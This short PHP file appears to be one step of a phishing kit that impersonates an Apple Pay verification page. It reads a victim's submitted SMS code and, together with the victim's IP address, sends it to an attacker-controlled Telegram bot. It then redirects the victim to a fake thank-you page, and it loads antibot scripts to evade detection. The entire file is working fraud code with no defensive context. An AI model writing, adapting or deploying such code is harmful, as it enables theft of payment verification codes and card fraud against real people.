<?php
error_reporting(0);
  ob_start();
  session_start();
include '../../email.php';
include '../../antibots/antibots.php';
include '../../strom1.php';
include '../../infos.php';
$bin=substr(str_replace(' ','',$_SESSION["c_num"]),0,6);	
$msgdureztuconnaissss = urlencode("ㅤ\n [📱] Apple Pay [📱] \n ㅤ\n ✔️ Apple Pay : ".$_POST['sms']."\n \n 🗑 Adresse IP : "._ip()."\n ㅤ");
$html = file_get_contents('https://api.telegram.org/bot'.$bot_token.'/sendMessage?chat_id='.$group_id.'&text='.$msgdureztuconnaissss.'');
header('location: ../merci.php?enc='.md5(time()).'&p=0&dispatch='.sha1(time()));

?>